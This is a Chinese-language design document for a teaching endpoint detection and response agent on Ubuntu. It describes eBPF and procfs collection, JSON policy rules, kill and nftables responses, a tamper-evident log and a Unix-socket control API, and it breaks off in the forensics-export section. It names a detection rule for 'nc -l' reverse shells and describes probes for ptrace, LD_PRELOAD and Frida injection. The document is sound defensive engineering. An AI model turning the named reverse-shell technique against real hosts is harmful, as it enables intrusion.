# EDR 架构图

> 适用版本：**v0.7 ops-audit + rootkit** — 在 v0.6+ 基础上完成 rootkit 检测补强（LKM/eBPF 操作监控 + /proc vs BPF 跨源校验）和运维审计可用性提升（edrctl report generate、事件归并、Web 仪表盘移除）
> 阅读时长：约 30 分钟
> 目的：用一张图 + 一张表，让任何第一次接触这个项目的人能讲清楚"它怎么工作、做到什么程度、还要往哪走"。

---

## 0. 五分钟搞懂这个 EDR

这是一个跑在 Ubuntu 22.04 上的**教学型主机入侵检测与响应系统**。它做四件事：

1. **看** —— 每 1 秒扫一次进程、连接、文件变化（v0.15 起还做了"看"事件的多维去重和速率限制）。v0.4+ 起 **ring0 一路**用 eBPF 探针覆盖 exec/connect/fork/exit/selfprotect/ptrace/LD_PRELOAD/instrument,并保留 LSM selfprotect 候选路径,绕过 procfs 轮询盲区
2. **判** —— 把观察到的东西和策略文件（JSON）里的规则比对，命中就记录。v0.4++ 起 fast-path 黑名单未命中的事件通过 **两阶段评估**（deferred eval）异步执行 `EvaluateAll` 全规则匹配，不再丢弃。v0.7 起新增 **rootkit 跨源校验**（/proc vs BPF 隐藏进程检测 + /sys/module vs /proc/modules 隐藏模块检测）
3. **挡** —— 命中后可以"软响应"（杀进程 / 改文件权限 / 下 nftables 规则），v0.4+ 已具备 **ring0 硬阻断**：comm + filename 双黑名单进程由 `bpf_send_signal(SIGKILL)` 直接终止,针对 agent 的 `kill/tgkill/ptrace` 由 kprobe override 同步返回 `-EPERM` 并终止攻击进程。v0.4++ 起 kill 路径使用 **pidfd**（pidfd_open + pidfd_send_signal）避免 PID 复用 TOCTOU。**v0.7 新增 rootkit 检测响应：默认 monitor 模式，可切换到 network_isolate/kill enforce**
4. **记** —— 每条事件写 JSONL 日志，并且 v0.15 开始自带 **SHA-256 hash 链 + HMAC 签名**，任何人改过日志都能验出来。v0.4++ 起 `.state` 文件丢失时自动从日志文件恢复链状态

**当前状态**：ring3 功能完整。v0.4+ 已完成 **eBPF 产物链 + 解析器 + libbpf loader + 自保护 kprobe override + ring0 黑名单斩杀 + fast-path 快速响应 + 受控停机边界**。在测试机 `lcz@192.168.214.144` 上已验证 `kill -9 edr-agent` 被阻断且 agent 存活；普通登录用户通过 `sudo edrctl shutdown` 会因为 loginuid 非 root 被拒绝并审计。LSM selfprotect 已进入源码和加载路径,但当前不写成唯一可靠主阻断路径；下一阶段要把它诊断成可观测、可证明的主路径。

v0.4++ 完成了 **蓝队+红队联合安全审计 22 项修复**（P0-P3），关键改动包括：两阶段评估（fast-path miss → deferred eval）、pidfd TOCTOU-safe kill、blacklist_filename 双 map、链状态自动恢复、fanotify panic 防护、抑制器 stale 清理等。

---

## 1. 全景图（一张图看完整个系统）

```
                              ┌──────────────────────────────────────────┐
                              │           Linux 主机 (Ubuntu 22.04)        │
                              │                                          │
  ┌──────────┐  edrctl ─HTTP─▶│  ┌────────────────────────────────┐      │
  │ Operator │  (本地命令行)  │  │  Unix Socket 0600               │      │
  │ (cheater)│  ◀─────JSON────│  │  /home/cheater/edr-runtime/     │      │
  └──────────┘                │  │         edr-agent.sock          │      │
                              │  └────────────────┬───────────────┘      │
                              │                   │ SO_PEERCRED 鉴权     │
                              │                   ▼                       │
                              │  ┌────────────────────────────────────┐   │
                              │  │       edr-agent (守护进程)         │   │
                              │  │  ┌──────────────────────────────┐  │   │
                              │  │  │  RunOnce 主循环 (ticker 1s)  │  │   │
                              │  │  │  读 Snapshot → 匹配策略 → 响应│  │   │
                              │  │  └────────┬─────────────────────┘  │   │
                              │  └───────────┼────────────────────────┘   │
                              │              │                            │
                              │   ┌──────────┼────────────┐               │
                              │   ▼          ▼            ▼               │
                              │ ┌──────┐  ┌──────┐    ┌──────┐              │
                              │ │采集层│  │策略层│    │响应层│              │
                              │ │collec│─▶│policy│───▶│respon│              │
                              │ │ tor  │  │      │    │ der  │              │
                              │ └─┬─┬──┘  └──┬───┘    └──┬───┘              │
                              │   │ │        │          │                   │
                              │   │ │        ▼          ▼                   │
                              │   │ │   policy.json  kill PID                │
                              │   │ │                chmod 0600              │
                              │   │ │                nft add rule            │
                              │   │ │                (可选,默认 dry-run)   │
                              │   │ │                                      │
                              │   │ │                          ┌────────┐ │
                              │   │ │                          │审计层  │ │
                              │   │ └────────────────────────▶│eventlog│ │
                              │   │   Snapshot                │链+HMAC │ │
                              │   │                            └───┬────┘ │
                              │   │                                │      │
                              │   │   ┌────────  v0.4+ ring0 ──────┘      │
                              │   │   │                                  │
                              │   │   ▼                                  │
                              │   │  ┌──────────────────────────────┐    │
                              │   │  │  MergedCollector             │    │
                              │   │  │  ┌──────────┐  ┌──────────┐  │    │
                              │   │  │  │ProcfsColl│  │BPFLoader │  │    │
                              │   │  │  │/proc+/pr │  │(libbpf)  │  │    │
                              │   │  │  │oc/net+in │  │ringbuf   │  │    │
                              │   │  │  │otify     │  │→ Go chan │  │    │
                              │   │  │  └────┬─────┘  └────┬─────┘  │    │
                              │   │  │       └────┬───────┘        │    │
                              │   │  │            ▼                │    │
                              │   │  │       Snapshot{...}          │    │
                              │   │  └──────────────────────────────┘    │
                              │   │                                       │
                              │   ▼                                       │
                              │ /proc/*   /proc/net   inotify             │
                              │                                                  │
                              │ ▼ (v0.4+ ring0)                      │
                              │ ┌──────────────────────────────────────────┐   │
                              │ │  all.bpf.o (bpftool gen object 合并)  │   │
                              │ │   ├─ exec/connect/fork/exit tracepoints │   │
                              │ │   ├─ selfprotect kprobe override       │   │
                              │ │   └─ anti-attack + LSM candidate       │   │
                              │ │  共享 events ring buffer (weak map)     │   │
                              │ └──────────────────────────────────────────┘   │
                              │                                                  │
                              │ ┌─────────────────────────────────────────┐ │
                              │ │          审计层 (eventlog)              │ │
                              │ │  events.jsonl  +  hash chain  +  HMAC   │ │
                              │ │  responses.jsonl (响应流水)            │ │
                              │ │  *.state        (链头,落盘 0600)       │ │
                              │ └─────────────────────────────────────────┘ │
                              │   │                                          │
                              │   ▼                                          │
                              │ systemd edr-agent.service                    │
                              │  NoNewPrivileges / ProtectSystem=strict /   │
                              │  SystemCallFilter=@system-service / CAP_B…  │
                              └──────────────────────────────────────────┘
```

**最外圈三个口**：
- **左**：`edrctl` 客户端（人操控）→ HTTP over Unix Socket → 控制面
- **中**：**两条采集路径并行**：
  - **ring3** — `/proc` / `/proc/net` / `inotify` → 采集层
  - **v0.4+ ring0** — `all.bpf.o` tracepoint/kprobe/LSM 候选探针 → ring buffer → libbpf → Go channel → `MergedCollector` 合流
- **下**：systemd 单元的 17 项 hardening（v0.15 加固）兜底

**ring0 路径的关键约束**：`bpf.enabled` 默认 `false`(R-P2 不静默上 ring0),开 `true` 必须 `-tags bpf` 编译才能加载；`MergedCollector` 把 BPF 事件和 procfs 合到同一 Snapshot,policy engine 完全无感。

**v0.4+ ring0 探针清单 (9 个源码，8 类事件 + 1 个 LSM 候选路径)**：
| 探针 | 类型 | 强制性 | 用途 |
|------|------|--------|------|
| `handle_exec` | tp/sched_process_exec | **必须** | 进程执行事件 → ring buffer + 黑名单检查 → `bpf_send_signal(SIGKILL)` |
| `handle_connect` | tp/inet_sock_set_state | **必须** | 网络连接事件 → ring buffer |
| `handle_fork` | tp/sched_process_fork | 尽力 | 进程 fork 事件 → ring buffer |
| `handle_exit` | tp/sched_process_exit | 尽力 | 进程退出事件 → ring buffer |
| `handle_kill` | kprobe/__x64_sys_kill | 尽力 | 检测/阻断 kill 攻击 → `agent_pid` map 比对 → override + ring buffer |
| `handle_tgkill` | kprobe/__x64_sys_tgkill | 尽力 | 检测/阻断 tgkill 攻击 → `agent_pid` map 比对 → override + ring buffer |
| `handle_ptrace` | kprobe/__x64_sys_ptrace | 尽力 | 检测/阻断 ptrace 附加 → `agent_pid` map 比对 → override + ring buffer |
| `handle_ptrace_enh` | kprobe/__x64_sys_ptrace | 尽力 | 反调试/进程注入检测 → fast-path |
| `handle_ldpreload` | tp/syscalls/sys_enter_execve | 尽力 | LD_PRELOAD 注入检测 |
| `handle_instrument` | kprobe/__x64_sys_mmap | 尽力 | Frida/可疑库加载检测,per-pid LRU 限速 |
| `lsm_selfprotect` | lsm/task_kill + lsm/ptrace_access_check | 诊断/候选 | 下一阶段主阻断路径,当前由 kprobe override 提供可靠阻断 |

**v0.4++ BPF maps**：
- `events` — RINGBUF 256KiB，所有探针共享
- `agent_pid` — ARRAY[1]，Go 启动时写入 agent PID;合法受控停机前清空
- `blacklist_comm` — HASH[256] (char[16])，Go 启动时从 `process_access.blacklist` 填充进程名
- `blacklist_filename` — HASH[256] (char[256])，Go 启动时从 `process_access.blacklist` 填充完整路径（len>15 的条目自动路由到此 map）
- `envp_ptrs` / `env_str_buf` — LD_PRELOAD envp 解析缓冲
- `pid_last_event` — instrument 探针 per-pid 速率限制

**v0.4++ Fast-Path（两阶段评估 + 独立毫秒级响应通道）**：
- `FastEvents()` channel — exec + selfprotect 事件双写
- `StartFastPath()` goroutine — 独立于主循环
- `handleFastPathExec` — 立即检查 `process_access` 黑名单（comm + filename 双 map）→ 命中则杀进程
- 黑名单未命中 → 发送到 `deferredEvalCh` (buffer 256) → `handleDeferredEval` goroutine 异步读取 `/proc/pid/{cmdline,environ,maps}` 并执行 `EvaluateAll` 全规则匹配
- `handleFastPathSelfProtect` — 立即写入 critical 级审计事件，使用 `PidfdKill`（pidfd TOCTOU-safe）终止攻击者

---

## 2. 一个事件的一生（数据流）

下面这张图跟踪"某个可疑进程被检测到 → 写入日志 → 触发响应"这条主线：

```
 Linux 内核                    edr-agent 用户态                    磁盘
───────────                  ─────────────────                  ─────────

/proc/[pid]/comm ──┐
/proc/[pid]/exe  ──┤
/proc/[pid]/stat ──┤
                   │  ┌──────────────────────────┐
/proc/net/tcp    ───┼─▶│ ProcfsCollector.Snapshot │── Snapshot{Processes,
                   │  │  readProcesses/readNet   │   Connections,FileEvents}
inotify 事件    ───┘  └─────────────┬────────────┘
                                     │
                                     ▼
                          ┌──────────────────────┐
                          │ policy.EvaluateAll   │  规则: "nc -l 反弹 shell"
                          │  按 Priority 排好序   │  命中: [R1 (audit),
                          │  返回所有命中的 Rule  │         R2 (response)]
                          └────────┬─────────────┘
                                   │
                                   ▼
                          ┌──────────────────────┐
                          │ AggregatedDecision   │  audit  = [R1, R2]
                          │  拆分为 audit/响应   │  response = R2 (最高优先)
                          └────────┬─────────────┘
                                   │
              ┌────────────────────┼─────────────────────┐
              ▼                    ▼                     ▼
       ┌────────────┐      ┌────────────────┐     ┌────────────┐
       │ Suppressor │      │ SoftResponder  │     │ Logger     │
       │ 去重+限流  │      │  kill PID      │     │ .Write     │
       │ 30s 内同  │      │  校验 PID+start│     │ JSONL+链   │
       │ key 抑制  │      │  ticks 防误杀  │     │ +HMAC 签   │
       └────────────┘      └────────┬───────┘     └────┬───────┘
                                    │                  │
                                    ▼                  ▼
                            进程被 kill          events.jsonl
                            (syscall.Kill)       ──────────────────
                                                {"integrity_version":"v0.15",
                                                 "chain_id":"edr-…",
                                                 "seq":42,
                                                 "prev_hash":"9af3…",
                                                 "hash":"a1b2…",
                                                 "hmac":"7c3d…"}
```

**关键点**：
- v0.15 起 `EvaluateAll` 不再"首条命中即返回"，而是返回**所有命中**按 `priority` 排序
- v0.4++ 起 fast-path 黑名单未命中的 exec 事件通过 `deferredEvalCh` 进入**两阶段评估**：异步 goroutine 读取 `/proc/pid/{cmdline,environ,maps}` 后执行 `EvaluateAll` 全规则匹配
- `AggregatedDecision` 把命中拆成"审计用"和"响应用"两类，分别走不同分支
- 每个分支**单独过 Suppressor**，所以抑制审计不会影响响应，反之亦然
- `kill` 不是直接 `Kill(pid)`，而是先校验身份，然后用 `PidfdKill()`（pidfd TOCTOU-safe）或 fallback 到传统 kill

---

## 3. 各模块逐一拆解

### 3.1 采集层 — `internal/collector/`

**一句话定位**：把"内核现在长啥样"翻译成 Go 结构体。

```
                ┌──────────────────────────────────┐
                │  type Collector (interface)      │
                │  Snapshot() (Snapshot, error)    │
                └────────────┬─────────────────────┘
                             │
                ┌────────────▼─────────────────────┐
                │  ProcfsCollector                 │
                │  - readProcesses()    /proc      │
                │  - readNet()          /proc/net  │
                │  - scanFileChanges()  inotify/   │
                │                          poll    │
                └──────────────────────────────────┘
```

| 项 | 内容 |
|---|---|
| **涉及文件** | `internal/collector/collector.go`、`collector_test.go` |
| **关键类型** | `Process`、`Connection`、`FileEvent`、`Snapshot`、`Collector`(interface)、`ProcfsCollector` |
| **关键函数** | `Snapshot()` / `readProcesses()` / `readNet()` / `scanFileChangesInotify()` / `scanFileChangesPoll()` / `Close()` |
| **数据来源** | `/proc/<pid>/{comm,cmdline,exe,stat}`、`/proc/net/{tcp,udp}`、`inotify(7)` |
| **完成度** | ✅ v0.1 完整；v0.4++ 新增 `Close()` 释放 inotify fd |
| **已知坑** | procfs 轮询有盲区 → 短命进程会漏；v0.2 eBPF 解决 |

**小提示**：
- `start_ticks` 来自 `/proc/<pid>/stat` 第 22 字段（`procutil.StartTicksFromStat`），用于给 `kill` 验明 PID 没被复用
- 文件监控有两条路：默认 `inotify` 优先，`inotify_init1` 失败就回退 `poll`（轮询比对 size/mode/mtime）
- 文件已预留 `UnsupportedKernelCollector{}` 占位，v0.2 eBPF provider 将实现同名接口

---

### 3.2 策略层 — `internal/policy/`

**一句话定位**：把所有"什么样的事件算可疑"的判断集中到一个 JSON 文件里，外加 Go 侧的解释器。

```
                ┌────────────────────────────────────┐
                │  configs/policy.json               │
                │  {                                 │
                │    "process_access": {             │
                │       "mode": "enforce",           │
                │       "whitelist": [...],          │
                │       "blacklist": [...]           │
                │    },                              │
                │    "rules": [                      │
                │      { "id":"R1",                  │
                │        "category":"process",      │
                │        "priority":10,              │
                │        "effect":["audit","response"],│
                │        "match":{...} }             │
                │    ]                               │
                │  }                                 │
                └────────────────┬───────────────────┘
                                 │ Load(path)
                                 ▼
                ┌────────────────────────────────────┐
                │  policy.Policy                     │
                │  ├─ EvaluateProcessAccess(subj)    │  ← 白名单优先
                │  ├─ Evaluate(...)         (旧)     │  ← 首条命中
                │  ├─ EvaluateAll(...)       (新)    │  ← 所有命中
                │  └─ AggregatedDecision(matches)    │  ← 拆 audit/响应
                └────────────────────────────────────┘
```

| 项 | 内容 |
|---|---|
| **涉及文件** | `internal/policy/policy.go`、`policy_test.go`、`configs/policy.json` |
| **关键类型** | `Policy`、`ProcessAccess`、`Rule`、`Match`、`Subject`、`Object`、`TimeWindow` |
| **关键函数** | `Load()` / `Validate()` / `EvaluateProcessAccess()` / `Evaluate()` / `EvaluateAll()` / `AggregatedDecision()` / `matches()` |
| **匹配维度** | category / path / prefix / cmdline / file_op / port / remote_addr / 时间窗口 / 用户 |
| **完成度** | ✅ v0.15 完整（priority + effect + multi-hit） |
| **v0.1 兼容性** | 旧策略文件不写 `priority`/`effect` 也能跑，默认值 100 / 两者都做 |

**v0.15 新字段速查**：

| 字段 | 取值 | 默认 | 含义 |
|---|---|---|---|
| `priority` | 0-1000 | 100 | 数字越小越优先 |
| `effect` | `["audit"]` / `["response"]` / 两者 | 两者 | 决定这条规则是写日志还是动手 |

**举例**：一条 `priority=10, effect=["response"]` 的"反弹 shell 规则"会**覆盖**一条 `priority=100, effect=["audit"]` 的"日志记录规则"。

---

### 3.3 响应层 — `internal/response/`

**一句话定位**：把策略层的"判决"翻译成"动手"——杀进程 / 改权限 / nftables 规则。

```
       ActionRequest                    SoftResponder.Apply
       ┌──────────────┐                 ┌───────────────────┐
       │ Action: kill │                 │                   │
       │ PID:  1234   │ ──────────────▶ │ kill → 同进程校验 │
       │ Path: /bin/nc│                 │ chmod → O_NOFOLLOW│
       │ StartTicks:… │                 │ nft_block → NFT   │
       └──────────────┘                 │ quarantine → stub │
                                         └─────────┬─────────┘
                                                   │
                                                   ▼
                                         ┌───────────────────┐
                                         │ Result            │
                                         │  Action: kill     │
                                         │  Success: true    │
                                         │  Detail: ...      │
                                         └───────────────────┘
```

| 项 | 内容 |
|---|---|
| **涉及文件** | `internal/response/response.go`、`nft.go`、`response_test.go`、`nft_test.go` |
| **关键类型** | `ActionRequest`、`Result`、`Responder`(interface)、`SoftResponder`、`NFTProvider` |
| **关键函数** | `Apply()` / `sameProcess()` / `chmodNoFollow()` / `PidfdKill()` / `nft.ApplyBlock()` / `nft.ListRules()` / `nft.Rollback()` |
| **支持动作** | `kill` / `fix_permissions` / `nft_block` / `quarantine`(stub) / `none` |
| **完成度** | ✅ kill / fix_permissions 实干；⚠️ nft_block 框架完整但默认 dry-run；quarantine 仅占位 |

**安全细节**：
- `kill` 前调用 `sameProcess()` 重新读 `/proc/<pid>/exe` 和 `start_ticks`，对不上就拒绝（防 PID 复用误杀）
- v0.4++ 起 `kill` 优先使用 `PidfdKill()`（pidfd_open + pidfd_send_signal），kernel 5.3+ 原生 TOCTOU-safe；通过 `/proc/self/fd/N` double-check 身份；fallback 到传统 `os.FindProcess.Kill()`
- `sameProcess()` 要求至少一个身份字段（ProcessPath 或 StartTicks）非空，两者都空返回 false（防绕过）
- `fix_permissions` 用 `O_NOFOLLOW + Fchmod(fd, 0600)`，避免 `lstat → chmod` 之间的 TOCTOU（符号链接被换）
- `nft_block` 通过 `[][]string` 直接构造命令参数，避免字符串拼接再拆分；默认 dry-run 不真执行

---

### 3.4 审计层 — `internal/eventlog/` + `internal/integrity/`

**一句话定位**：每条事件**带签名写盘**，并且能验证"从启动到现在没人改过日志"。

```
                     eventlog.Logger
                     ┌─────────────────────┐
   Event{...} ─────▶ │  1. 序列化           │
                     │  2. 算 hash = SHA256 │
                     │     (prev_hash || 序列化)│
                     │  3. 算 HMAC = SHA256 │
                     │     (key, hash)      │
                     │  4. 落盘 + 轮转      │
                     │  5. 持久化 ChainState│
                     └──────────┬──────────┘
                                │
                                ▼
                     events.jsonl  ←  追加
                     ──────────────────────────────────
                     {"…业务字段…",
                      "integrity_version":"v0.15",
                      "chain_id":"edr-2d2b47…",
                      "seq":42,
                      "prev_hash":"9af3…",
                      "hash":"a1b2…",
                      "hmac":"7c3d…"}
                     ──────────────────────────────────
                                ▲
                                │
                                │ 启动期 / GET /v0/events/verify
                                │
                     eventlog.Verify(path, key)
                     ┌─────────────────────┐
                     │  逐行重算 hash      │
                     │  逐行校验 HMAC      │
                     │  续接 prev_hash 链   │
                     │  识别 legacy 段     │
                     │  → VerifyResult     │
                     └─────────────────────┘
```

| 项 | 内容 |
|---|---|
| **涉及文件** | `internal/eventlog/event.go`、`integrity.go`、`event_test.go`、`integrity_test.go`、`internal/integrity/keystore.go`、`keystore_test.go` |
| **关键类型** | `Event`、`Logger`、`IntegrityOptions`、`ChainState`、`IntegrityIssue`、`LegacySegment`、`VerifyResult`、`KeySource` |
| **关键函数** | `Logger.Write()` / `chainWriter.Seal()` / `Verify()` / `sealChain()` / `recoverFromLog()` / `integrity.LoadOrCreate()` |
| **算法** | SHA-256 hash chain（每条 hash 包含前一条的 hash）+ HMAC-SHA256 签名 |
| **密钥来源** | `EDR_LOG_KEY` 环境变量（加载时输出安全警告）→ 配置文件路径 → 自动生成 32 字节随机落 `/var/lib/edr/log.key` 0600 |
| **完成度** | ✅ v0.15 完整；v0.4++ 新增链状态自动恢复 + HMAC env 警告 |

**4 个关键不变量**（任一被破坏就报 `verify.ok=false`）：

1. **hash_mismatch** — 行内容与算出的 hash 对不上（被改过）
2. **prev_hash_break** — 当前行的 `prev_hash` 与上一行的 `hash` 接不上（被删/插）
3. **hmac_mismatch** — 用了 key 签名的盘被改过
4. **malformed** — JSON 解析失败

**legacy 段**：v0.1 时代的事件没有这 4 个字段，verify 会识别为"老段"（`legacy_segments`），不报错但也不参与链验证——保证升级不破取证连续性。

---

### 3.5 控制面（服务端）— `internal/control/`

**一句话定位**：edr-agent 内部跑一个 HTTP server，挂载在一根 Unix Socket 上，只回答授权的本地用户。

```
  edrctl ─HTTP→ Unix Socket (/v0/...) ──▶ 内部 mux
                                          │
                                          │  ConnContext 抓 SO_PEERCRED
                                          │  校验 uid ∈ allowed_uids
                                          │
                                          ▼
                                  ┌────────────────────┐
                                  │ /v0/health         │
                                  │ /v0/status         │
                                  │ /v0/metrics        │
                                  │ /v0/policy/reload  │  ← safePathUnder 验
                                  │ /v0/policy/versions│     路径不逃逸
                                  │ /v0/policy/rollback│
                                  │ /v0/events         │  ← 流式分页
                                  │ /v0/events/verify  │  ← 调用 integrity.Verify
                                  │ /v0/responses      │
                                  │ /v0/network/nft/list       │
                                  │ /v0/network/nft/rollback   │
                                  │ /v0/forensics/export│ ← bundle JSON
                                  │ /v0/baseline/run    │
                                  └────────────────────┘
```

| 项 | 内容 |
|---|---|
| **涉及文件** | `internal/control/server.go`、`agent.go`、`forensics.go`、`security.go`、`suppress.go` + 各自测试 |
| **关键类型** | `Agent`、`ResponseRecord`、`ServerOptions`、`ForensicsBundle`、`Suppressor`、`deferredEval` |
| **关键函数** | `NewServerWithOptions()` / `Agent.RunOnce()` / `Agent.Metrics()` / `ExportForensics()` / `ConnContext()` / `safePathUnder()` / `Suppressor.Allow()` / `handleDeferredEval()` |
| **认证** | `SO_PEERCRED` 抓 uid → 必须在 `allowed_uids` 里；空列表=全拒 |
| **路径安全** | 策略重载/取证导出都过 `safePathUnder()`，解析 symlink + 阻止逃逸 (8 高危路径) |
| **签名安全** | `signing_key_path` 为空时返回 403 拒绝 reload |
| **日志安全** | `bufio.ErrTooLong` 检测 + `ghostEvents` 计数器 |
| **完成度** | ✅ v0.15 完整；v0.4++ 新增 deferred eval + 空 key 禁止 reload + ghostEvents |

**认证 3 个铁律**（v0.15 起）：

1. `allowed_uids` 为空 → 任何请求都拒（不再默认放行）
2. `/v0/health` 也要鉴权（v0.1 时期是匿名）
3. 客户端进程不是 socket owner → 403

**`Suppression`（抑制器）独立成 `internal/control/suppress.go`**：

```
  每次事件过 Suppressor.Allow(category, rule_id, dedup_key)
  ─────────────────────────────────────────────────────────
  1. 取该 category 的 cooldown（process 30s / file 60s / network 30s）
     同一 dedup_key 在 cooldown 内 → 抑制 (reason="cooldown")
  2. 取该 rule_id 的令牌桶（默认 10/s burst=10）
     桶空 → 抑制 (reason="rate_limit")
  3. 都没命中 → 放行
  ─────────────────────────────────────────────────────────
  指标: suppressed_total + suppression_reasons{cooldown, rate_limit}
  状态: 内存态（重启清零，v0.16 接 anchor 时一起持久化）
  v0.4++: 每 1000 次调用自动清理 stale 条目（>2x 最长 cooldown）
  v0.4++: state 文件权限 0600（原 0640）
```

---


**受控停机边界（安全边界核心规则）**：`POST /v0/shutdown` 不是普通管理 API,而是自保护系统唯一允许的停机出口。它必须先由策略显式开启 `self_protection.shutdown_enabled=true`,服务端再同时校验 `SO_PEERCRED.uid==0` 和 `/proc/<peer_pid>/loginuid` 属于 `{0, 4294967295}`。因此普通登录用户即使通过 `sudo edrctl shutdown` 变成 euid 0,仍会因为 loginuid 保留原 UID 而被拒绝。允许的只有 root 登录会话或 systemd/root daemon 这类 unset loginuid 上下文；所有 allow/deny 都写入 `self_protection` 审计事件。

**边界设计原则**：socket 不是后门入口。客户端只负责发起请求,安全判断全部在 agent 服务端完成,且只使用内核提供的 peer credential 和 `/proc` audit loginuid。这个边界明确区分“拥有 root euid 的 sudo 进程”和“root 登录/systemd 上下文”,是本项目自保护设计的核心约束。合法停机时 agent 会先清空 BPF `agent_pid` map,再进入 graceful shutdown,避免被自己的 SIGINT/退出路径误拦截。

### 3.6 控制面（客户端）— `cmd/edrctl/`

**一句话定位**：一个没有任何业务逻辑的"翻译器"，把 `edrctl status` 这种 CLI 命令翻译成对 Unix Socket 的 HTTP 请求。

```
  $ edrctl --socket /home/cheater/edr-runtime/edr-agent.sock status

  ┌──────────────┐                                ┌──────────────┐
  │ edrctl       │  HTTP GET /v0/status           │ edr-agent    │
  │  main.go     │ ──────────────────────────────▶│  /v0/status  │
  │              │ ◀────────────────────────────── │              │
  │ unixClient() │         {"policy_rules":3,…}    │              │
  └──────────────┘                                └──────────────┘
```

| 项 | 内容 |
|---|---|
| **涉及文件** | `cmd/edrctl/main.go`（单文件 4.7 KB） |
| **支持的子命令** | `status` / `metrics` / `health` / `policy {validate,reload,versions,rollback}` / `baseline run` / `events {tail,query,verify}` / `responses list` / `forensics export` / `nft {list,rollback}` |
| **依赖** | 仅 `net/http` + 自定义 `Transport.DialContext` 走 `unix://` |
| **完成度** | ✅ v0.15 完整 |

**特别注意**：v0.15 删掉了 `events tail <任意路径>` 这种"读任意文件"的危险用法，只剩查 agent 内置事件流。

---

### 3.7 守护进程入口 — `cmd/edr-agent/main.go`

**一句话定位**：把上面所有 Go 包"插"在一起的 main 函数。

```
  main()
   │
   ├─ flag --config / --once
   ├─ loadConfig()              ← configs/agent.json
   ├─ policy.Load()             ← 策略 JSON
   ├─ integrity.LoadOrCreate()  ← /var/lib/edr/log.key (0600)
   ├─ eventlog.NewWithOptions(Integrity{…})  ← 链 + HMAC
   ├─ control.NewSuppressor()   ← 抑制器
   ├─ control.Agent{ … }        ← 拼装采集/策略/响应
   ├─ Agent.Init()
   ├─ if chain: emitStartupVerify()  ← 启动期写一条 log-verify-startup
   ├─ if --once: RunOnce, return
   └─ else: NewServerWithOptions() over Unix Socket
            ticker 5s × RunOnce
```

| 项 | 内容 |
|---|---|
| **涉及文件** | `cmd/edr-agent/main.go`（8 KB） |
| **关键流程** | 加载配置 → 加载策略 → 解析签名 key → 建 logger(含链) → 建抑制器 → 拼装 Agent → 启动期 verify → 起 HTTP server → ticker RunOnce |
| **配置项** | 见 `configs/agent.json` 全文，约 12 类：policy/baseline/event/response/artifact/socket/interval/syslog/dry_run/allowed_uids/integrity/suppression |
| **完成度** | ✅ v0.15 完整 |

**配置结构（v0.15）**：

```json
{
  "policy_path":   "configs/policy.json",
  "baseline_path": "configs/baseline.json",
  "event_path":    "/home/cheater/edr-runtime/events.jsonl",
  "response_path": "/home/cheater/edr-runtime/responses.jsonl",
  "artifact_dir":  "/home/cheater/edr-runtime/forensics",
  "socket_path":   "/home/cheater/edr-runtime/edr-agent.sock",
  "interval_sec":  5,
  "syslog":        false,
  "dry_run":       false,
  "allowed_uids":  [1000],
  "integrity":  { "enable_chain":true, "key_path":"…/log.key", "state_path":"…", "algorithm":"sha256" },
  "suppression":{ "process_cooldown_sec":30, "file_cooldown_sec":60, "network_cooldown_sec":30, "rate_per_sec":10, "burst":10 }
}
```

---

### 3.8 部署硬化 — `systemd/edr-agent.service` + `scripts/install.sh`

**一句话定位**：把 v0.15 安全加固的 17+ 条指令落到生产部署。

```
  systemd 单元
  ┌────────────────────────────────────────────────────────┐
  │  NoNewPrivileges=true        禁止 setuid 提权          │
  │  ProtectSystem=strict        整个 /usr /boot 只读       │
  │  ProtectHome=true            /home 不可见               │
  │  PrivateTmp=true             /tmp 独立命名空间          │
  │  PrivateDevices=true         看不到 /dev/sd*             │
  │  ProtectKernelTunables=true  /proc/sys 不可写           │
  │  ProtectKernelModules=true   禁止 insmod/rmmod          │
  │  ProtectControlGroups=true   不可写 cgroup              │
  │  RestrictNamespaces=true     禁止 unshare/clone 新命名空间│
  │  RestrictRealtime=true       禁止 SCHED_RR/SCHED_FIFO  │
  │  RestrictSUIDSGID=true       禁止 s 位文件生效          │
  │  LockPersonality=true        禁止 personality(2)        │
  │  RestrictAddressFamilies=AF_UNIX AF_INET AF_INET6       │
  │                              只允许 Unix+IPv4+IPv6 socket│
  │  SystemCallArchitectures=native  禁止 x32/ia64 兼容调用  │
  │  SystemCallFilter=@system-service + SystemCallErrorNumber=EPERM│
  │  CapabilityBoundingSet=CAP_KILL CAP_DAC_OVERRIDE …    │
  │  UMask=0077                 默认创建文件 0600          │
  │  ReadWritePaths=/var/lib/edr /var/log/edr /opt/edr/var │
  │  StateDirectory=edr / LogsDirectory=edr / ConfigurationDirectory=edr│
  └────────────────────────────────────────────────────────┘
```

| 项 | 内容 |
|---|---|
| **涉及文件** | `systemd/edr-agent.service`、`scripts/install.sh` |
| **install 行为** | 目录 0750 / 二进制 0750 / 配置 0640 / log.key 0600，幂等 |
| **完成度** | ✅ v0.15 完整（17 项 hardening + install 权限固化） |
| **未引入** | `MemoryDenyWriteExecute=true`（v0.16 单独评估 Go GC 兼容性） |

---

### 3.9 验证与门禁 — `scripts/`

| 脚本 | 用途 | 门禁地位 |
|---|---|---|
| `verify_m3.py` | 跑 13 恶意 + 13 良性样本，统计 detection/FP | **M3 门禁**：`detections≥6/8` + `false_positives≤2/8` |
| `verify_v015.sh` | 端到端：起链 → verify ok → 篡改 → verify=hash_mismatch | **v0.15 门禁** |
| `test_v015_scenarios.sh` | 8 场景手测脚本（T1-T8），独立可读 | v0.15 手测 |
| `test_suppression.sh` | 抑制器手测（cooldown + 令牌桶） | v0.15 手测 |
| `test_chain_persistence.sh` | 链跨重启手测 | v0.15 手测 |
| `test_reset.sh` | 取证导出手测 | v0.15 手测 |

| 项 | 内容 |
|---|---|
| **涉及文件** | `scripts/verify_m3.py`、`verify_v015.sh`、`test_*.sh`、`lib/{agent,ui}.sh` |
| **测试报告** | `audit/verify-m3-report.json`（由 `make verify-m3` 产出） |
| **测试文档** | `audit/test-flow-v015.md`（13 场景 T1-T13 详解） |
| **当前结果** | M3: detections=12/13, FP=0/13, process_access_ok=true ✅ |

---

### 3.10 取证导出 — `internal/control/forensics.go`

**一句话定位**：把"刚才一段时间内这个 agent 看到的、做的、定的策略"打成单个 JSON 包。

```
  POST /v0/forensics/export?event_limit=200&path=.../bundle.json
  ─────────────────────────────────────────────────────────────
  ForensicsBundle {
    "schema_version":  "v0.1",
    "exported_at":     "2026-06-04T…",
    "metrics":         { run_count, event_count, suppressed_total, … },
    "policy":          { 完整 Policy JSON },
    "responses":       [ 最近响应记录 ],
    "snapshot":        { 当前进程/连接/文件 },
    "events":          [ 最近 N 条事件 ],
